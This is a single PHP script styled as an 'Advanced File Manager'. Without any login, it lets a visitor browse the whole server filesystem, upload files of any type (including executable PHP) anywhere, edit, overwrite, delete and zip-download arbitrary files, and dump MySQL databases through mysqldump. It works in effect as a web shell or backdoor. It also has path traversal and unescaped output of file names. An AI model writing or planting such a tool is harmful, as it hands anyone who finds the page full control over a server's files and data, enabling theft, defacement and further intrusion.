<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);

// ==== EXPORT FULL DATABASE (Manual Credentials) ====
if (isset($_GET['downloadsql'])) {
    $dbuser = $_GET['user'] ?? '';
    $dbpass = $_GET['pass'] ?? '';
    $dbname = $_GET['dbname'] ?? '';
    $dbhost = $_GET['host'] ?? '';

    if (!$dbuser || !$dbpass || !$dbname || !$dbhost) {
        die("❌ Missing database credentials.");
    }

    $filename = 'db_backup_' . date("Y-m-d_H-i-s") . '.sql';
    $filepath = sys_get_temp_dir() . '/' . $filename;

    putenv("MYSQL_PWD=$dbpass");

    $command = "mysqldump -h" . escapeshellarg($dbhost) .
               " -u" . escapeshellarg($dbuser) .
               " " . escapeshellarg($dbname) .
               " > " . escapeshellarg($filepath);

    exec($command, $output, $return_var);
    putenv("MYSQL_PWD");

    if ($return_var !== 0 || !file_exists($filepath)) {
        die("❌ Failed to export database.");
    }

    if (ob_get_level()) ob_end_clean();
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($filename));
    header('Content-Length: ' . filesize($filepath));
    readfile($filepath);
    unlink($filepath);
    exit;
}

// ==== ZIP SELECTED FILES/FOLDERS ====
if (isset($_POST['zip_selected']) && !empty($_POST['selected_items'])) {
    $zipFile = sys_get_temp_dir() . '/selected_' . time() . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        foreach ($_POST['selected_items'] as $item) {
            $item = realpath($item);
            if (is_file($item)) {
                $zip->addFile($item, basename($item));
            } elseif (is_dir($item)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($item, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($item) + 1);
                        $zip->addFile($filePath, basename($item) . '/' . $relativePath);
                    }
                }
            }
        }
        $zip->close();
        if (ob_get_level()) ob_end_clean();
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="selected_items.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    } else {
        die("❌ ZIP creation failed.");
    }
}

// ==== DELETE FILE OR FOLDER ====
if (isset($_GET['delete'])) {
    $target = urldecode($_GET['delete']);
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== CREATE NEW FILE ====
if (isset($_POST['newfile'])) {
    file_put_contents($path . '/' . $_POST['newfile'], '');
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== CREATE NEW FOLDER ====
if (isset($_POST['newfolder'])) {
    mkdir($path . '/' . $_POST['newfolder']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== UPLOAD FILE ====
if (isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== EDIT FILE ====
if (isset($_GET['edit'])) {
    $file = urldecode($_GET['edit']);
    if (!file_exists($file)) die("❌ File not found.");
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=" . urlencode(dirname($file)));
        exit;
    }
    $content = file_get_contents($file);
    echo "<!DOCTYPE html><html><head><title>Edit</title><style>
        body { background: #1e1e2e; color: #fff; font-family: monospace; padding: 20px; }
        textarea { width: 100%; height: 80vh; background: #1b1b1b; color: #00ff90; border: none; padding: 10px; }
        button { padding: 10px 20px; margin-top: 10px; background: #00ff90; color: black; border: none; cursor: pointer; }
    </style></head><body>";
    echo "<h2>Editing: $file</h2>
    <form method='post'>
        <textarea name='content'>" . htmlspecialchars($content) . "</textarea><br>
        <button type='submit'>💾 Save</button>
    </form>
    </body></html>";
    exit;
}

$files = scandir($path);
?>

<!DOCTYPE html>
<html>
<head>
    <title>🧰 Advanced File Manager</title>
    <style>
        body {
            margin: 0; font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #25283D, #1F1F2E);
            color: #eee;
        }
        header {
            background: #313454;
            padding: 15px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #00ff90;
        }
        .tools a, .tools button {
            background: #00ff90;
            color: #000;
            padding: 8px 14px;
            border: none;
            margin-right: 10px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        .main { padding: 20px; }
        table { width: 100%; background: #2a2d40; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; }
        th { background: #1f1f2e; color: #00ff90; }
        .create-area input, .tools input[type='file'] {
            padding: 6px; margin-right: 10px; background: #222; color: #00ff90; border: 1px solid #444; border-radius: 3px;
        }
        #zipPanel {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #1f1f2e;
            color: #00ff90;
            padding: 15px 20px;
            border-radius: 10px;
            border: 1px solid #00ff90;
            box-shadow: 0 0 15px #00ff90;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
<header>
    <h2>📂 File Manager</h2>
    <div class="tools">
        <a href="?path=<?= urlencode(dirname($path)) ?>">🔙 Go Up</a>
        <a href="?path=<?= urlencode($path) ?>&downloadzip=1">📦 ZIP Current</a>

        <!-- Manual DB Export Form -->
        <form method="get" style="display:inline;">
            <input type="hidden" name="downloadsql" value="1">
            <input type="text" name="host" placeholder="Host" required>
            <input type="text" name="user" placeholder="User" required>
            <input type="password" name="pass" placeholder="Pass" required>
            <input type="text" name="dbname" placeholder="Database" required>
            <button type="submit">🗃️ Export DB</button>
        </form>

        <form method="POST" enctype="multipart/form-data" style="display:inline;">
            <input type="file" name="file">
            <button name="upload">📤 Upload</button>
        </form>
    </div>
</header>

<div class="main">
    <h3>Current Path: <?= htmlspecialchars($path) ?></h3>

    <form method="post" class="create-area">
        <input type="text" name="newfile" placeholder="New file name" required>
        <button type="submit">📄 Create File</button>
    </form>

    <form method="post" class="create-area">
        <input type="text" name="newfolder" placeholder="New folder name" required>
        <button type="submit">📁 Create Folder</button>
    </form>

    <form method="post">
        <table>
            <tr>
                <th><input type="checkbox" id="select_all" onclick="toggleAll(this)"></th>
                <th>Name</th><th>Type</th><th>Action</th>
            </tr>
            <?php foreach ($files as $f):
                if ($f === '.' || $f === '..') continue;
                $fullpath = $path . '/' . $f; ?>
                <tr>
                    <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($fullpath) ?>"></td>
                    <td><?= is_dir($fullpath) ? "<a href='?path=" . urlencode($fullpath) . "'>📁 $f</a>" : "📄 $f"; ?></td>
                    <td><?= is_dir($fullpath) ? 'Dir' : 'File' ?></td>
                    <td>
                        <?php if (is_file($fullpath)): ?>
                            <a href="?edit=<?= urlencode($fullpath) ?>">✏️ Edit</a>
                        <?php endif; ?>
                        <a href="?delete=<?= urlencode($fullpath) ?>" onclick="return confirm('Delete this item?')">❌ Delete</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
    </form>
</div>

<!-- ZIP Panel -->
<div id="zipPanel">
    <strong>📦 Ready to ZIP:</strong>
    <ul id="zipList" style="max-height: 200px; overflow-y: auto; margin-top: 10px; padding-left: 20px;"></ul>
    <form method="post">
        <input type="hidden" name="zip_selected" value="1">
        <div id="zipHiddenInputs"></div>
        <button type="submit" style="margin-top: 10px; background:#00ff90; color:#000; padding: 5px 12px; border:none; border-radius:4px;">⬇️ Download ZIP</button>
    </form>
</div>

<script>
function toggleAll(source) {
    const checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
    checkboxes.forEach(cb => cb.checked = source.checked);
    updateZipPanel();
}

document.querySelectorAll('input[name="selected_items[]"]').forEach(cb => {
    cb.addEventListener('change', updateZipPanel);
});

function updateZipPanel() {
    const selected = Array.from(document.querySelectorAll('input[name="selected_items[]"]:checked'));
    const zipPanel = document.getElementById('zipPanel');
    const zipList = document.getElementById('zipList');
    const zipInputs = document.getElementById('zipHiddenInputs');

    zipList.innerHTML = '';
    zipInputs.innerHTML = '';

    if (selected.length > 0) {
        zipPanel.style.display = 'block';
        selected.forEach(cb => {
            const path = cb.value;
            const li = document.createElement('li');
            li.textContent = path.split('/').pop();
            zipList.appendChild(li);

            const hidden = document.createElement('input');
            hidden.type = 'hidden';
            hidden.name = 'selected_items[]';
            hidden.value = path;
            zipInputs.appendChild(hidden);
        });
    } else {
        zipPanel.style.display = 'none';
    }
}
</script>

</body>
</html>
